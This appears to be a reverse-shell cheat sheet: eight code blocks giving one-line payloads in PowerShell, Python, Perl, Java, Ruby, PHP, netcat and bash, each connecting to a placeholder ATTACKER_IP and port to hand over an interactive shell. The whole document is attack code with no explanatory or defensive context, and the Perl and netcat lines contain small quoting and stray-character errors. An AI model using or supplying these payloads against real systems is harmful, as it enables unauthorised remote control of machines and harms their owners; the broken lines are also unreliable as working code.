# Powershell
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
# Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
# Perl
```
perl -e use Socket;$i = "ATTACKER_IP";$p = ATTACKER_PORT;socket(S, PF_INET, SOCK_STREAM,getprotobyname("tcp"));if (connect(S, sockaddr_in($p, inet_aton($i)))) {open(STDIN,  ">&S");open(STDOUT, ">&S");open(STDERR, ">&S");exec("/bin/sh -i");}
```
# Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
# Ruby
```
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",ATTACKER_PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
# PHP
```
php -r '$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```
# netcat
```
nc -e /bin/sh ATTACKER_IP ATTACKER_PORT`
```
# bash
```
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```